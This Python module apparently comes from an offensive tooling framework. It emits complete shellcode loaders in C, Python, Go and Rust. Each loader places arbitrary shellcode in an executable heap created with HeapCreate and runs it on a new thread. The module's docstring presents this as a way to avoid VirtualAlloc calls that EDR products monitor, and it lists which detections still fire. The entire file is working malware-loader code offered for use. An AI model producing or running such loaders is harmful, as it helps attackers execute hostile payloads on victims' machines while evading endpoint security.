"""Loader: win_heap_exec — HeapCreate(EXECUTE) → HeapAlloc → memcpy → CreateThread.

Tier 2. Avoids VirtualAlloc entirely for the allocation step.
HeapCreate with HEAP_CREATE_ENABLE_EXECUTE returns a heap whose pages
are automatically marked executable. Subsequent HeapAlloc from that heap
produces RWX-equivalent memory without an explicit VirtualAlloc(RWX) call.

Evasion property:
  - No direct VirtualAlloc(PAGE_EXECUTE_*) call in the import trace
  - HeapCreate is a less-monitored vector on some older sensor stacks

Still triggers on:
  - Executable heap creation (flagged by modern EDR at kernel level)
  - CreateThread from non-image-backed page
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_heap_exec")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sc_len, 0);
    if (!heap) {{
        fprintf(stderr, "[-] HeapCreate failed: %lu\\n", GetLastError());
        return 1;
    }}

    LPVOID mem = HeapAlloc(heap, 0, sc_len);
    if (!mem) {{
        fprintf(stderr, "[-] HeapAlloc failed\\n");
        HeapDestroy(heap);
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        HeapFree(heap, 0, mem);
        HeapDestroy(heap);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    HeapFree(heap, 0, mem);
    HeapDestroy(heap);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32
kernel32.HeapCreate.restype = ctypes.c_void_p
kernel32.HeapAlloc.restype  = ctypes.c_void_p
kernel32.CreateThread.restype = ctypes.c_void_p

HEAP_CREATE_ENABLE_EXECUTE = 0x00040000

heap = kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(sc), 0)
if not heap:
    sys.exit(1)

mem = kernel32.HeapAlloc(ctypes.c_void_p(heap), 0, len(sc))
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(mem), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


_GO_TEMPLATE = """\
package main

import (
\t"syscall"
\t"unsafe"
)

{sc_bytes}

func main() {{
\tk32            := syscall.NewLazyDLL("kernel32.dll")
\tpHeapCreate    := k32.NewProc("HeapCreate")
\tpHeapAlloc     := k32.NewProc("HeapAlloc")
\tpHeapDestroy   := k32.NewProc("HeapDestroy")
\tpCreateThread  := k32.NewProc("CreateThread")
\tpWaitSingle    := k32.NewProc("WaitForSingleObject")
\tpRtlMove       := k32.NewProc("RtlMoveMemory")

\tconst heapCreateEnableExecute = 0x00040000
\theap, _, _ := pHeapCreate.Call(heapCreateEnableExecute, uintptr(len(sc)), 0)
\tif heap == 0 {{
\t\treturn
\t}}
\tdefer pHeapDestroy.Call(heap)
\taddr, _, _ := pHeapAlloc.Call(heap, 0, uintptr(len(sc)))
\tif addr == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
\tht, _, _ := pCreateThread.Call(0, 0, addr, 0, 0, 0)
\tif ht == 0 {{
\t\treturn
\t}}
\tpWaitSingle.Call(ht, 0xFFFFFFFF)
}}
"""

_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::ptr;

#[link(name = "kernel32")]
extern "system" {{
    fn HeapCreate(flOptions: u32, dwInitialSize: usize, dwMaximumSize: usize) -> *mut u8;
    fn HeapAlloc(hHeap: *mut u8, dwFlags: u32, dwBytes: usize) -> *mut u8;
    fn HeapFree(hHeap: *mut u8, dwFlags: u32, lpMem: *mut u8) -> i32;
    fn HeapDestroy(hHeap: *mut u8) -> i32;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize,
                    lpStartAddress: unsafe extern "system" fn(*mut u8) -> u32,
                    lpParameter: *mut u8, dwCreationFlags: u32,
                    lpThreadId: *mut u32) -> *mut u8;
    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
    fn CloseHandle(hObject: *mut u8) -> i32;
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let heap = HeapCreate(0x00040000, sc.len(), 0);
        if heap.is_null() {{ return; }}
        let p = HeapAlloc(heap, 0, sc.len());
        if p.is_null() {{ HeapDestroy(heap); return; }}
        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
        let entry: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(p);
        let ht = CreateThread(ptr::null_mut(), 0, entry, ptr::null_mut(), 0, ptr::null_mut());
        if ht.is_null() {{ HeapFree(heap, 0, p); HeapDestroy(heap); return; }}
        WaitForSingleObject(ht, 0xFFFFFFFF);
        CloseHandle(ht);
        HeapFree(heap, 0, p);
        HeapDestroy(heap);
    }}
}}
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))


def generate_go(shellcode: bytes) -> str:
    """Return a Go loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))


def generate_rust(shellcode: bytes) -> str:
    """Return a Rust loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
